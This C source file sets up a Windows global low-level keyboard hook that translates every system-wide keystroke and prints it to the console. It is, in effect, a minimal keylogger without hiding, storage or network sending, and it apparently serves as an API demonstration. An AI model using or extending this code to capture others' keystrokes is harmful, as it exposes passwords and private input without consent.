#include <stdio.h>
#include <windows.h>

LRESULT CALLBACK hook_proc(
    int code,
    WPARAM wParam,
    LPARAM lParam
)
{
    if(code >= 0)
    {
        if (wParam == WM_KEYDOWN){
            KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)lParam;
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState);

            WCHAR buffer[5];

            int res = ToUnicode(
                kb->vkCode,
                kb->scanCode,
                keyboardState,
                buffer,
                4,
                0
            );

            if(res > 0){
                printf("%lc \n", buffer[0]);
            }
        }

    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}


int main()
{
    HHOOK hook;

    hook = SetWindowsHookExA(
        WH_KEYBOARD_LL,
        hook_proc,
        NULL,
        0
    );

    if(hook == NULL)
    {
        printf("Failed to install hook\n");
        return 1;
    }

    MSG msg;

    while(GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);

    return 0;
}